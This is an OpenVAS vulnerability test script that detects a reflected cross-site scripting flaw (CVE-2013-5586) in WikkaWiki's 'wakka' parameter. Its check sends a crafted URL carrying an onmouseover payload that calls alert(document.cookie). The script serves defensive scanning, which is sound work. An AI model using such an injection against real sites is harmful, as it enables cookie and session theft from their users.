###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wikkawiki_xss_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# WikkaWiki Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803892");
  script_version("$Revision: 11865 $");
  script_cve_id("CVE-2013-5586");
  script_bugtraq_id(62325);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-09-16 15:14:50 +0530 (Mon, 16 Sep 2013)");
  script_name("WikkaWiki Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is running WikkaWiki and is prone to cross-site scripting
  vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to
  read the cookie or not.");
  script_tag(name:"solution", value:"Upgrade to WikkaWiki 1.3.4-p1 or later.");
  script_tag(name:"insight", value:"Input passed via 'wakka' parameter to 'wikka.php' script is not properly
  sanitised before being returned to the user.");
  script_tag(name:"affected", value:"WikkaWiki 1.3.4 and probably prior.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/54790");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Sep/47");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23170");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://www.wikkawiki.org");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

if(!can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/wikka", "/wiki", "/wikkawiki", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  if(http_vuln_check(port:http_port, url:string(dir,"/HomePage"),
                                check_header:TRUE,
                                pattern:"WikkaWiki<"))
  {
    url = dir + '/"onmouseover="javascript:alert(document.cookie)';

    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"onmouseover=.javascript:alert\(document.cookie\)",
       extra_check:make_list(">Powered by WikkaWiki<")))
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);